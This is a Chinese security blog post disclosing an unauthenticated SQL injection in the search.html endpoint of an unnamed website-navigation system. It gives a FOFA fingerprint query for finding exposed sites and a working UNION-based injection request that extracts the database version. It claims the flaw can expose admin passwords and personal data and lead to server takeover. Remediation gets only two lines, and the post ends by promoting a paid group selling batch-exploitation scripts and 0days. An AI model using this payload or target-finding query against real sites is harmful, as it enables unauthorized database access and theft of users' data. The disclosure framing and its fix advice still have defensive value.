#  某网址导航页 搜索页面存在SQL注入漏洞   
冷漠安全  冷漠安全   2024-05-22 23:01  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qRzaH5GUoT3wjfxgNKKQaVgq5UdQuTjibZ7l0YMRTIbMrfABFictia4ZEXKWAic1RbHRib9CiajtbcKQcw/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
某网址导航系统是一种智能化的网址导航平台，旨在帮助用户快速找到所需的网址和资源。该系统提供了智能化的网址搜索和推荐功能，能够根据用户的搜索习惯和偏好推荐相关的网址和资源。同时，系统还提供了网址分类、网址收藏和网址分享等功能，方便用户管理和共享网址  
。  
  
0x03  
  
**漏洞威胁**  
  
某网址导航页 search.html 接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="./templates/antidote/css/style.css"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o6wTvMCNVDFjVeyXKMOgKfqSygsia8NRmQXSSo8GKzlN4QfbMicw5I60STl5dDPyUAT3GBCJQotogQ/640?wx_fmt=png&from=appmsg "")  
  
0x05  
  
**漏洞复现**  
  
POC  
```
GET /search.html?keyword='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x2d2d2d2d2d,version(),0x2d2d2d2d2d),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: keep-alive
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o6wTvMCNVDFjVeyXKMOgKfRddticM3icphyaCsBSDXbdfl6wIfTice7wAsPRuHeEVFcQlmDE8ShCLjA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o6wTvMCNVDFjVeyXKMOgKfUURAuaLYpMYbpHaADLtyCNGfhZWaiazzF6Liab3oFYSib6TRSNaD2WOdQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
使用参数化查询或存储过程来执行 SQL 查询  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o6wTvMCNVDFjVeyXKMOgKfEnMsDvE7Kia4FZtLTnOkt7vHzlafqrrTkib7FWOKp7sHGE456gPicW8XA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0o6wTvMCNVDFjVeyXKMOgKfeVJcJkhAbhyNwr3q43hRC6YtziaxicnVF95x1XtR7Lib90CWnkRLkootA/640?wx_fmt=gif&from=appmsg "")  
  
  
  
